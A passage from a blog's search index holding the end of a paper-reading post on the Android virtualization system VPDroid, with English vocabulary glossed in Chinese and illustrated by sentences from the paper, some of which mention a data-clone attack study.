sensitive data will be in jeopardy without raising suspicion.</li><li>citation（引文）：The citation [19] provides more details to advocate the subscription-based app economy. For the smart home apps, we also purchase related smart home devices, including one smart lock, two security - cameras, and one smart light bulb, to test whether we can control them after launching a data-clone attack.</li><li>imperceptible（察觉不到的）：User-mode apps in the VP are imperceptible to the change of device; this requires our virtualization and device-attribute customization functions are invisible to user-mode apps running in - the VP.</li><li>proprietary（特有的，专有的）：some hardware vendors provide proprietary software</li><li>pseudo（假的）：The Binder driver is a custom pseudo driver with no corresponding physical device.</li><li>To the best of our knowledge（据我们所知）：To the best of our knowledge, VPDroid offers the most comprehensive Android device-attribute editing options so far.</li></ul><h2 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h2><p>GitHub - VPDroid&#x2F;Dev: VPDroid is a lightweight Android OS-level virtualization architecture</p><p>​</p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 论文精读 </tag>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
